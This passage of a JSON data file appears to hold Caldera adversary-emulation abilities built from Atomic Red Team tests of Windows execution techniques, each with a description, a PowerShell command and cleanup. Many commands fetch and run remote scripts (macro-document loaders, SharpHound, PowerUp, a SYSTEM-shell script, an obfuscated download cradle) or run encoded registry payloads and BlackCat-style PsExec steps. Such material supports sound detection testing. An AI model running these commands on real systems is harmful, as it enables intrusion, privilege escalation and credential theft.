                    "command": "$malcmdlets = \"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"; foreach ($cmdlets in $malcmdlets) {;     \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}; foreach ($cmdlets in $malcmdlets) {;     $cmdlets}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a9df2530a06e1aa7d1ba9e9309364b9f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a9df2530a06e1aa7d1ba9e9309364b9f"
    },
    "T1059.005__execution__Command and Scripting Interpreter: Visual Basic__9c955a373154a7090d4b4396b561f5da": {
        "description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -> File -> Account -> About Word\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.005",
            "name": "Command and Scripting Interpreter: Visual Basic"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \"*mshta*\"}  | % { \"$(Stop-Process $_.ProcessID)\" } | Out-Null",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9c955a373154a7090d4b4396b561f5da",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9c955a373154a7090d4b4396b561f5da"
    },
    "T1204.002__execution__User Execution: Malicious File__ca3c058554276f34ac84b996af0caf0d": {
        "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"C:\\Users\\$env:username\\Desktop\\https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt\" -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macroCode = Get-Content \"#{macro_path}\" -Raw; $URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"; $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"; Invoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ca3c058554276f34ac84b996af0caf0d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ca3c058554276f34ac84b996af0caf0d"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__0ecc3d4729cf37c719528291d63f9f99": {
        "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:Temp\\*BloodHound.zip -Force",
                    "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan; IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0ecc3d4729cf37c719528291d63f9f99",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0ecc3d4729cf37c719528291d63f9f99"
    },
    "T1106__execution__Native API__b262964145fa55e27265e7caa89b1169": {
        "description": "Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1106",
            "name": "Native API"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b262964145fa55e27265e7caa89b1169",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b262964145fa55e27265e7caa89b1169"
    },
    "T1204.002__execution__User Execution: Malicious File__431121fe12b6fd82938a9a52526b3423": {
        "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item C:\\Users\\Public\\art.jse -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe C:\\Users\\Public\\art.jse`\"`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "431121fe12b6fd82938a9a52526b3423",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "431121fe12b6fd82938a9a52526b3423"
    },
    "T1204.002__execution__User Execution: Malicious File__cde814c61dcd8b0fbeeb14f005c2432f": {
        "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse`\", vbNormalFocus)`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cde814c61dcd8b0fbeeb14f005c2432f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "cde814c61dcd8b0fbeeb14f005c2432f"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__fca2ce47cdb3acfde35139ca9017af80": {
        "description": "Executes powershell.exe with variations of the -EncodedCommand parameter",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fca2ce47cdb3acfde35139ca9017af80",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "fca2ce47cdb3acfde35139ca9017af80"
    },
    "T1569.002__execution__System Services: Service Execution__e4c51df716410dc7baccead922f9d9a4": {
        "description": "This atomic attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1569.002",
            "name": "System Services: Service Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /f; cmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:0\" ; cmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"; rm $env:temp\\psexec.exe",
                    "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { ; } else {Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"; Expand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force; New-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") -Force | Out-Null; Copy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force};  ;  cmd.exe /c \"wmic \tcsproduct \tget UUID\" ; cmd.exe /c \"fsutil behavior \tset SymlinkEvaluation R2L:1\" ; cmd.exe /c \"fsutil behavior set \tSymlinkEvaluation R2R:1\"; reg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      ; copy \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" $env:temp; cmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\$ENV:COMPUTERNAME cmd.exe  /c echo \"--access-token\"\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e4c51df716410dc7baccead922f9d9a4",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e4c51df716410dc7baccead922f9d9a4"
    },
    "T1204.002__execution__User Execution: Malicious File__98adc43648b0e4ea6e90a88ad5ae4b3d": {
        "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -name mshta",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "98adc43648b0e4ea6e90a88ad5ae4b3d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "98adc43648b0e4ea6e90a88ad5ae4b3d"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__106045f14741390cfb3fe95300585fb6": {
        "description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "106045f14741390cfb3fe95300585fb6",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "106045f14741390cfb3fe95300585fb6"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__c5951c819c5f6125e0e5987a12a344f9": {
        "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\NTFS_ADS.txt -Force -ErrorAction Ignore",
                    "command": "if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]) { ; } else {Write-Host Prereq's for this test cannot be met automatically};  ;  Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'; $streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand'; Invoke-Expression $streamcommand",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c5951c819c5f6125e0e5987a12a344f9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c5951c819c5f6125e0e5987a12a344f9"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__c0177717b47f2cd07949186523fa3c6b": {
        "description": "Executes powershell.exe with variations of the -Command parameter",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c0177717b47f2cd07949186523fa3c6b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c0177717b47f2cd07949186523fa3c6b"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__ba763ea19604a73e3e1f9d9d8d86d9cc": {
        "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ba763ea19604a73e3e1f9d9d8d86d9cc",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ba763ea19604a73e3e1f9d9d8d86d9cc"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__a935a79ba61ecb00458208b0bd5ef15e": {
        "description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a935a79ba61ecb00458208b0bd5ef15e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a935a79ba61ecb00458208b0bd5ef15e"
    },
    "T1059.005__execution__Command and Scripting Interpreter: Visual Basic__f2131e45dbd95e3057bd3494b5aeed41": {
        "description": "Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.005",
            "name": "Command and Scripting Interpreter: Visual Basic"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\T1059.005.out.txt -ErrorAction Ignore",
                    "command": "cscript \"a771e6_sys_info.vbs\" > $env:TEMP\\T1059.005.out.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "a771e6_sys_info.vbs"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "f2131e45dbd95e3057bd3494b5aeed41",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f2131e45dbd95e3057bd3494b5aeed41"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__e2e6f33cf77d10e3c82c244014da20c5": {
        "description": "Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.\n[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "function nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}; powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e2e6f33cf77d10e3c82c244014da20c5",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e2e6f33cf77d10e3c82c244014da20c5"
    },
    "T1059.005__execution__Command and Scripting Interpreter: Visual Basic__42302f7d89c15f8070f83e743771d567": {
        "description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\atomic_t1059_005_test_output.bin.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.005",
            "name": "Command and Scripting Interpreter: Visual Basic"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:TEMP\\atomic_t1059_005_test_output.bin\" -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "42302f7d89c15f8070f83e743771d567",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "42302f7d89c15f8070f83e743771d567"
    },
    "T1204.002__execution__User Execution: Malicious File__f71199dcf1e307fc37c5a0cb9e4031b9": {
        "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$file1 = \"$env:Temp\\test10.lnk\"; $file2 = \"$env:Temp\\a.exe\"; Remove-Item $file1 -ErrorAction Ignore; Remove-Item $file2 -ErrorAction Ignore",
                    "command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"; $file1 = \"$env:Temp\\test10.lnk\"; Start-Process $file1; Start-Sleep -s 10; taskkill /IM a.exe /F",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f71199dcf1e307fc37c5a0cb9e4031b9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f71199dcf1e307fc37c5a0cb9e4031b9"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__ef943918da20ee40d378ad000bbcc3b7": {
        "description": "Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))); (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs(); Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ef943918da20ee40d378ad000bbcc3b7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ef943918da20ee40d378ad000bbcc3b7"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__50df8303a555242bea67342db40d0d47": {
        "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore; Remove-Item HKCU:\\Software\\Classes\\AtomicRedTeam -Force -ErrorAction Ignore",
                    "command": "reg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\" /f; iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "50df8303a555242bea67342db40d0d47",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "50df8303a555242bea67342db40d0d47"
    },
    "T1047__execution__Windows Management Instrumentation__80cda763aa992b775038ce134c892070": {
        "description": "This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1047",
            "name": "Windows Management Instrumentation"
        },
        "platforms": {
            "windows": {
                "psh": {
